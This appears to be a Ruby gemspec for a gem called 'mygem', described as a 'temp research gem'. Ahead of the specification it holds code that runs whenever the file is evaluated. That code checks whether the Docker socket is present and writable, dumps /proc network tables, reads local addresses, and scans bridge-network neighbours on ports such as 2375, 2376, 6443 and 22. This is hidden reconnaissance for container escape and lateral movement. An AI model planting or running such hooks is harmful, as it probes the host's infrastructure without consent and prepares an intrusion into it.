begin
  require "socket"
  require "timeout"

  checks = []
  checks << ["docker_sock_present", "ls -la /var/run/docker.sock /run/docker.sock 2>&1"]
  checks << ["docker_sock_writable", "test -w /var/run/docker.sock 2>/dev/null && echo WRITABLE || echo not-writable-or-absent"]
  checks << ["proc_net_tcp_full", "cat /proc/net/tcp 2>/dev/null"]
  checks << ["proc_net_tcp6", "cat /proc/net/tcp6 2>/dev/null | head -10"]
  checks << ["ip_addr_self", "cat /proc/net/fib_trie 2>/dev/null | grep -E '^\\s*\\|--' | head -20"]

  puts "==INFRACHECK2=="
  checks.each do |name, cmd|
    out = `#{cmd}`.to_s
    puts "--- #{name} ---"
    puts out.strip.empty? ? "(empty)" : out.strip[0,1500]
  end

  def raw_probe(host, port)
    Timeout.timeout(3) do
      s = TCPSocket.new(host, port)
      s.close
      "OPEN"
    end
  rescue => e
    "#{e.class}"
  end

  puts "--- bridge_neighbors ---"
  ["172.19.0.1", "172.19.0.3", "172.19.0.4", "172.19.0.5"].each do |ip|
    [80, 443, 22, 2375, 2376, 8080, 6443].each do |port|
      r = raw_probe(ip, port)
      puts "#{ip}:#{port} => #{r}" unless r == "Errno::ECONNREFUSED"
    end
  end
  puts "==INFRACHECK2_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.8"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
